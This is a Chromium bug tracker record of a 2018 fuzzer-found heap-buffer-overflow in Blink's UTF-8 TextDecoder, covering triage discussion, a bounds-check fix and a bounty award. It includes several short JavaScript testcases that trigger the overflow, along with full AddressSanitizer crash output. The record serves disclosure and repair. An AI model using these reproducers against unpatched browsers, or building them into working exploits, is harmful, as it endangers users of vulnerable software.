# Heap-buffer-overflow in bool WTF::TextCodecUTF8::HandlePartialSequence<unsigned short>

| Field | Value |
|-------|-------|
| **Issue ID** | [40092923](https://issues.chromium.org/issues/40092923) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Internals>WTF |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, iOS, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2018-11-01 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell

**VERSION**  

Chrome Version: asan-linux-release-604610  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
o5=new AudioContext();
o7=new Uint8Array(32);
o8=o7.buffer;
o169=new TextDecoder('utf-8');
o211=new AnalyserNode(o5,{maxDecibels:-1});
o273=o211.getByteTimeDomainData(o7);
o373=o169.decode(o8,{stream: true});
o1135=new ArrayBuffer(4294967295);
o1188=o169.decode(o1135,{stream: true});
</script>

Crash State:

=================================================================  

==32153==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200004a03e at pc 0x55f202e2dee4 bp 0x7ffcb8257c80 sp 0x7ffcb8257c78  

WRITE of size 2 at 0x60200004a03e thread T0 (content\_shell)  

#0 0x55f202e2dee3 in bool WTF::TextCodecUTF8::HandlePartialSequence<unsigned short>(unsigned short\*&, unsigned char const\*&, unsigned char const\*, bool, bool, bool&) third\_party/blink/renderer/platform/wtf/text/text\_codec\_utf8.cc:241:22  

#1 0x55f202e2f329 in WTF::TextCodecUTF8::Decode(char const\*, unsigned int, WTF::FlushBehavior, bool, bool&) third\_party/blink/renderer/platform/wtf/text/text\_codec\_utf8.cc:395:7  

#2 0x55f2082e7b10 in blink::TextDecoder::decode(char const\*, unsigned int, blink::TextDecodeOptions const\*, blink::ExceptionState&) third\_party/blink/renderer/modules/encoding/text\_decoder.cc:106:22  

#3 0x55f2082e77db in blink::TextDecoder::decode(blink::ArrayBufferOrArrayBufferView const&, blink::TextDecodeOptions const\*, blink::ExceptionState&) third\_party/blink/renderer/modules/encoding/text\_decoder.cc  

#4 0x55f2082e3edf in decodeMethod gen/third\_party/blink/renderer/bindings/modules/v8/v8\_text\_decoder.cc:131:25  

#5 0x55f2082e3edf in blink::V8TextDecoder::decodeMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/modules/v8/v8\_text\_decoder.cc:193  

#6 0x55f1f8b96af6 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) v8/src/api-arguments-inl.h:144:3  

#7 0x55f1f8b93f57 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36  

#8 0x55f1f8b91cca in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:139:5  

#9 0x55f1fa8d27ca (/fuzzer3/dl/asan-linux-release-604610/content\_shell+0xae657ca)  

#10 0x7ed5d510610d (<unknown module>)  

#11 0x55f1fa841ee2 (/fuzzer3/dl/asan-linux-release-604610/content\_shell+0xadd4ee2)  

#12 0x7ed5d51020d6 (<unknown module>)  

#13 0x55f1f96392df in Call v8/src/simulator.h:113:12  

#14 0x55f1f96392df in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:156  

#15 0x55f1f9638b32 in CallInternal v8/src/execution.cc:192:10  

#16 0x55f1f9638b32 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:203  

#17 0x55f1f89e972a in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:2120:7  

#18 0x55f202ed9624 in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:288:22  

#19 0x55f204ae167c in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:131:20  

#20 0x55f204ae3faa in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&, blink::ScriptController::ExecuteScriptPolicy) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:348:33  

#21 0x55f204ae49d1 in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:312:3  

#22 0x55f2070779c6 in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script\*, blink::ScriptElementBase\*, bool, bool, bool, base::TimeTicks, bool) third\_party/blink/renderer/core/script/pending\_script.cc:274:13  

#23 0x55f2070773da in blink::PendingScript::ExecuteScriptBlock(blink::KURL const&) third\_party/blink/renderer/core/script/pending\_script.cc:185:3  

#24 0x55f20707c9e1 in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/blink/renderer/core/script/script\_loader.cc:733:9  

#25 0x55f20703591e in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:541:20  

#26 0x55f207035248 in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:320:3  

#27 0x55f205bf9221 in RunScriptsForPausedTreeBuilder third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:278:21  

#28 0x55f205bf9221 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:535  

#29 0x55f205bf4291 in blink::HTMLDocumentParser::PumpPendingSpeculations() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:593:9  

#30 0x55f203db1153 in Run base/callback.h:99:12  

#31 0x55f203db1153 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third\_party/blink/renderer/platform/web\_task\_runner.cc:55  

#32 0x55f1fd793f1b in Run base/callback.h:99:12  

#33 0x55f1fd793f1b in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#34 0x55f1fd88e552 in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:196:23  

#35 0x55f1fd793f1b in Run base/callback.h:99:12  

#36 0x55f1fd793f1b in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#37 0x55f1fd7903ba in base::MessageLoop::RunTask(base::PendingTask\*) base/message\_loop/message\_loop.cc:545:46  

#38 0x55f1fd79110d in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:556:5  

#39 0x55f1fd79110d in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:628  

#40 0x55f1fd79afdf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:37:31  

#41 0x55f1fd80e87b in base::RunLoop::Run() base/run\_loop.cc:102:14  

#42 0x55f20b02b0d3 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:202:16  

#43 0x55f1faf555c5 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:495:14  

#44 0x55f1faf591e5 in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:906:10  

#45 0x55f202d36e5f in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:472:29  

#46 0x55f1f84c725c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#47 0x55f1f59b5cc7 in main content/shell/app/shell\_main.cc:39:10  

#48 0x7fa21c480b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

0x60200004a03e is located 0 bytes to the right of 14-byte region [0x60200004a030,0x60200004a03e)  

allocated by thread T0 (content\_shell) here:  

#0 0x55f1f59866a3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:146:3  

#1 0x55f202df2889 in PartitionAllocGenericFlags base/allocator/partition\_allocator/partition\_alloc.h:354:48  

#2 0x55f202df2889 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:375  

#3 0x55f202df2889 in BufferMalloc third\_party/blink/renderer/platform/wtf/allocator/partitions.h:97  

#4 0x55f202df2889 in WTF::StringImpl::CreateUninitialized(unsigned int, unsigned short\*&) third\_party/blink/renderer/platform/wtf/text/string\_impl.cc:132  

#5 0x55f202e2eb19 in StringBuffer third\_party/blink/renderer/platform/wtf/text/string\_buffer.h:49:13  

#6 0x55f202e2eb19 in WTF::TextCodecUTF8::Decode(char const\*, unsigned int, WTF::FlushBehavior, bool, bool&) third\_party/blink/renderer/platform/wtf/text/text\_codec\_utf8.cc:380  

#7 0x55f2082e7b10 in blink::TextDecoder::decode(char const\*, unsigned int, blink::TextDecodeOptions const\*, blink::ExceptionState&) third\_party/blink/renderer/modules/encoding/text\_decoder.cc:106:22  

#8 0x55f2082e77db in blink::TextDecoder::decode(blink::ArrayBufferOrArrayBufferView const&, blink::TextDecodeOptions const\*, blink::ExceptionState&) third\_party/blink/renderer/modules/encoding/text\_decoder.cc  

#9 0x55f2082e3edf in decodeMethod gen/third\_party/blink/renderer/bindings/modules/v8/v8\_text\_decoder.cc:131:25  

#10 0x55f2082e3edf in blink::V8TextDecoder::decodeMethodCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) gen/third\_party/blink/renderer/bindings/modules/v8/v8\_text\_decoder.cc:193  

#11 0x55f1f8b96af6 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) v8/src/api-arguments-inl.h:144:3  

#12 0x55f1f8b93f57 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36  

#13 0x55f1f8b91cca in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) v8/src/builtins/builtins-api.cc:139:5  

#14 0x55f1fa8d27ca (/fuzzer3/dl/asan-linux-release-604610/content\_shell+0xae657ca)  

#15 0x7ed5d510610d (<unknown module>)  

#16 0x55f1fa841ee2 (/fuzzer3/dl/asan-linux-release-604610/content\_shell+0xadd4ee2)  

#17 0x7ed5d51020d6 (<unknown module>)  

#18 0x55f1f96392df in Call v8/src/simulator.h:113:12  

#19 0x55f1f96392df in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:156  

#20 0x55f1f9638b32 in CallInternal v8/src/execution.cc:192:10  

#21 0x55f1f9638b32 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:203  

#22 0x55f1f89e972a in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:2120:7  

#23 0x55f202ed9624 in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:288:22  

#24 0x55f204ae167c in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:131:20  

#25 0x55f204ae3faa in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&, blink::ScriptController::ExecuteScriptPolicy) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:348:33  

#26 0x55f204ae49d1 in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::AccessControlStatus, blink::ScriptFetchOptions const&) third\_party/blink/renderer/bindings/core/v8/script\_controller.cc:312:3  

#27 0x55f2070779c6 in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script\*, blink::ScriptElementBase\*, bool, bool, bool, base::TimeTicks, bool) third\_party/blink/renderer/core/script/pending\_script.cc:274:13  

#28 0x55f2070773da in blink::PendingScript::ExecuteScriptBlock(blink::KURL const&) third\_party/blink/renderer/core/script/pending\_script.cc:185:3  

#29 0x55f20707c9e1 in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/blink/renderer/core/script/script\_loader.cc:733:9  

#30 0x55f20703591e in blink::HTMLParserScriptRunner::ProcessScriptElementInternal(blink::Element\*, WTF::TextPosition const&) third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:541:20  

#31 0x55f207035248 in blink::HTMLParserScriptRunner::ProcessScriptElement(blink::Element\*, WTF::TextPosition const&) third\_party/blink/renderer/core/script/html\_parser\_script\_runner.cc:320:3  

#32 0x55f205bf9221 in RunScriptsForPausedTreeBuilder third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:278:21  

#33 0x55f205bf9221 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:535  

#34 0x55f205bf4291 in blink::HTMLDocumentParser::PumpPendingSpeculations() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:593:9  

#35 0x55f203db1153 in Run base/callback.h:99:12  

#36 0x55f203db1153 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third\_party/blink/renderer/platform/web\_task\_runner.cc:55  

#37 0x55f1fd793f1b in Run base/callback.h:99:12  

#38 0x55f1fd793f1b in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#39 0x55f1fd88e552 in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:196:23

SUMMARY: AddressSanitizer: heap-buffer-overflow third\_party/blink/renderer/platform/wtf/text/text\_codec\_utf8.cc:241:22 in bool WTF::TextCodecUTF8::HandlePartialSequence<unsigned short>(unsigned short\*&, unsigned char const\*&, unsigned char const\*, bool, bool, bool&)  

Shadow bytes around the buggy address:  

0x0c04800013b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800013c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800013d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800013e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c04800013f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c0480001400: fa fa fc fa fa fa 00[06]fa fa fa fa fa fa fa fa  

0x0c0480001410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480001420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480001430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480001440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0480001450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==32153==ABORTING

## Timeline

### cl...@chromium.org (2018-11-01)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5648114729615360.

### pa...@chromium.org (2018-11-01)

This code looks old and was last updated largely by Apple peeps; it may be that WebKit is vulnerable too. Cloudfuzzer, do you want to file/have you already filed a Radar?

[Monorail components: Blink>Internals>WTF]

### cl...@chromium.org (2018-11-01)

Detailed report: https://clusterfuzz.com/testcase?key=5648114729615360

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 2
Crash Address: 0x6090001b1e5e
Crash State:
  bool WTF::TextCodecUTF8::HandlePartialSequence<unsigned short>
  blink::TextDecoder::decode
  blink::TextDecoder::decode
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5648114729615360

See https://github.com/google/clusterfuzz-tools for more information.

### cl...@gmail.com (2018-11-01)

I have not been able to reproduce this against WebKit. It also doesn't allow me to allocate such large ArrayBuffers. It looks like Chrome only recently allowed large ArrayBuffer allocations.

It looks like the truncation happens here: https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/encoding/text_decoder.cc?rcl=a9476fa3b516382ab67e3908044fd994f09b48ea&l=93

And this code does not seem to be shared with WebKit. They are using a size_t instead: https://github.com/WebKit/webkit/blob/89c28d471fae35f1788a0f857067896a10af8974/Source/WebCore/dom/TextDecoder.cpp#L97


### js...@chromium.org (2018-11-01)

Joshua, can you take a look? Thanks !

### js...@chromium.org (2018-11-01)

Hmm, locally (tip of tree, non-ASAN 64-bit linux build) the `new ArrayBuffer(4294967295);` allocation fails. Wonder why that's making it through for others...?

I assume this subset has the same repro?

<script>
	o169=new TextDecoder('utf-8');
	o1135=new ArrayBuffer(4294967295);
	o1188=o169.decode(o1135,{stream: true});
</script>


re: It looks like the truncation happens here: https://cs.chromium.org/chromium/src/third_party/blink/renderer/modules/encoding/text_decoder.cc?rcl=a9476fa3b516382ab67e3908044fd994f09b48ea&l=93

That's mapping an `unsigned` to a `uint32_t` so I don't think that's the culprit unless I'm missing something. 

This looks likely:

https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/text/text_codec_utf8.cc?g=0&l=380

... which is on the allocation stack. With the repro case, this is trying to allocate (0xffffffff + 4) which is going to overflow.

### js...@chromium.org (2018-11-01)

Ah, a reduced repro will need to have some junk at the start, which is why the extra stuff is needed. This should do:

<script>
        preamble = new Uint8Array([128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128, 128]);
	decoder = new TextDecoder('utf-8');
        decoder.decode(preamble, {stream: true});
	big = new ArrayBuffer(4294967295);
	decoder.decode(big, {stream: true});
</script>

A shorter preamble probably works too. Again, the big allocation fails on my machine, so can't repro. Grrr....

### in...@chromium.org (2018-11-01)

Did you try this with an ASan build ? See "You can reproduce this crash painlessly with our reproduce tool." section in c#3.


### js...@chromium.org (2018-11-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2018-11-01)

Does ASAN build v8 with any strange configs? Looks like "v8_enable_verify_heap = true" but that doesn't do it. Per adamk and https://crbug.com/v8/7881 we shouldn't enable ArrayBuffer allocations that big yet.

I'll try an ASAN build, but that shouldn't affect whether or not `new ArrayBuffer(4294967295)` works.

(There's totally a bug here where TextCodecUTF8::Decode() will produce an overflow on valid inputs. And we need to fix since we *will* allow ArrayBuffer allocations that big. But... it should not be allowed today since bugs like this are probably prevalent...) 

### ad...@chromium.org (2018-11-02)

I may have mislead jsbell. My reading of the V8 code is actually that we rely on the ArrayBuffer::Allocator passed to us by the embedder to limit allocations. In Blink, this is PartitionAlloc. So it's really up to PartitionAlloc, not V8, whether such allocations are allowed.

### js...@chromium.org (2018-11-02)

Thanks for brainstorming with me, adamk!

Can execute `new ArrayBuffer(4294967295)` and repro with release/ASAN build of chrome. That's.... somewhat disturbing? 

Anyway, as expected, shorter repro works:

    preamble = new Uint8Array([128]);
    decoder = new TextDecoder('utf-8');
    decoder.decode(preamble, {stream: true});
    big = new ArrayBuffer(4294967295);
    decoder.decode(big, {stream: true});

And FYI, without the preamble we hit a CHECK:

    decoder = new TextDecoder('utf-8');
    big = new ArrayBuffer(4294967295);
    decoder.decode(big);

[1:1:1101/171335.748032:FATAL:string_impl.h(445)] Check failed: length <= ((std::numeric_limits<wtf_size_t>::max() - sizeof(StringImpl)) / sizeof(CharType)) (4294967295 vs. 4294967283)

... which is WAI. We need a CHECK in the TextCodecUTF8::Decode cases to avoid the overflow (there are two such cases)

### js...@chromium.org (2018-11-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-11-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/dae5b388b44dae4dc11668dba210bbb92d72d969

commit dae5b388b44dae4dc11668dba210bbb92d72d969
Author: Joshua Bell <jsbell@chromium.org>
Date: Fri Nov 02 19:23:54 2018

Add bounds CHECK to UTF-8 decoder memory allocation.

Avoid integer overflow when computing a total buffer size from a base
buffer and small partial sequence buffer.

Bug: 901030
Change-Id: Ic82db2c6af770bd748fb1ec881999d0dfaac30f0
Reviewed-on: https://chromium-review.googlesource.com/c/1313833
Reviewed-by: Chris Palmer <palmer@chromium.org>
Commit-Queue: Joshua Bell <jsbell@chromium.org>
Cr-Commit-Position: refs/heads/master@{#605011}
[modify] https://crrev.com/dae5b388b44dae4dc11668dba210bbb92d72d969/third_party/blink/renderer/platform/wtf/text/text_codec_utf8.cc
[modify] https://crrev.com/dae5b388b44dae4dc11668dba210bbb92d72d969/third_party/blink/renderer/platform/wtf/text/text_codec_utf8_test.cc


### js...@chromium.org (2018-11-02)

Not sure if this can be triggered in M71, but the underlying bug is still there and the fix is simple, so might as well merge if security peeps agree. Can let this bake a bit. 

### sh...@chromium.org (2018-11-02)

This bug requires manual review: Less than 28 days to go before AppStore submit on M71
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-11-02)

+awhalley@ (Security TPM) for M71 merge review

### cl...@chromium.org (2018-11-03)

ClusterFuzz has detected this issue as fixed in range 605010:605011.

Detailed report: https://clusterfuzz.com/testcase?key=5648114729615360

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 2
Crash Address: 0x6090001b1e5e
Crash State:
  bool WTF::TextCodecUTF8::HandlePartialSequence<unsigned short>
  blink::TextDecoder::decode
  blink::TextDecoder::decode
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=605010:605011

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5648114729615360

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-11-03)

ClusterFuzz testcase 5648114729615360 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-11-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-11-05)

[Empty comment from Monorail migration]

### aw...@google.com (2018-11-05)

Thanks jsbell@.

govind@ - good for 71

### be...@chromium.org (2018-11-05)

Thanks Andrew!

Approved for merge to 71, branch 3578.

### be...@chromium.org (2018-11-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-11-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2d5eb7355b137ddf21c933ae2e8f30d1f302db07

commit 2d5eb7355b137ddf21c933ae2e8f30d1f302db07
Author: Joshua Bell <jsbell@chromium.org>
Date: Mon Nov 05 22:44:41 2018

Add bounds CHECK to UTF-8 decoder memory allocation.

Avoid integer overflow when computing a total buffer size from a base
buffer and small partial sequence buffer.

Bug: 901030
Change-Id: Ic82db2c6af770bd748fb1ec881999d0dfaac30f0
Reviewed-on: https://chromium-review.googlesource.com/c/1313833
Reviewed-by: Chris Palmer <palmer@chromium.org>
Commit-Queue: Joshua Bell <jsbell@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#605011}(cherry picked from commit dae5b388b44dae4dc11668dba210bbb92d72d969)
Reviewed-on: https://chromium-review.googlesource.com/c/1318731
Reviewed-by: Joshua Bell <jsbell@chromium.org>
Cr-Commit-Position: refs/branch-heads/3578@{#528}
Cr-Branched-From: 4226ddf99103e493d7afb23a4c7902ee496108b6-refs/heads/master@{#599034}
[modify] https://crrev.com/2d5eb7355b137ddf21c933ae2e8f30d1f302db07/third_party/blink/renderer/platform/wtf/text/text_codec_utf8.cc
[modify] https://crrev.com/2d5eb7355b137ddf21c933ae2e8f30d1f302db07/third_party/blink/renderer/platform/wtf/text/text_codec_utf8_test.cc


### cr...@appspot.gserviceaccount.com (2018-11-05)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/2d5eb7355b137ddf21c933ae2e8f30d1f302db07

Commit: 2d5eb7355b137ddf21c933ae2e8f30d1f302db07
Author: jsbell@chromium.org
Commiter: jsbell@chromium.org
Date: 2018-11-05 22:44:41 +0000 UTC

Add bounds CHECK to UTF-8 decoder memory allocation.

Avoid integer overflow when computing a total buffer size from a base
buffer and small partial sequence buffer.

Bug: 901030
Change-Id: Ic82db2c6af770bd748fb1ec881999d0dfaac30f0
Reviewed-on: https://chromium-review.googlesource.com/c/1313833
Reviewed-by: Chris Palmer <palmer@chromium.org>
Commit-Queue: Joshua Bell <jsbell@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#605011}(cherry picked from commit dae5b388b44dae4dc11668dba210bbb92d72d969)
Reviewed-on: https://chromium-review.googlesource.com/c/1318731
Reviewed-by: Joshua Bell <jsbell@chromium.org>
Cr-Commit-Position: refs/branch-heads/3578@{#528}
Cr-Branched-From: 4226ddf99103e493d7afb23a4c7902ee496108b6-refs/heads/master@{#599034}

### aw...@chromium.org (2018-11-12)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-11-12)

Hi cloudfuzzer@, $3,000 for this report, cheers!

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-02-09)

This issue was migrated from crbug.com/chromium/901030?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092923)*
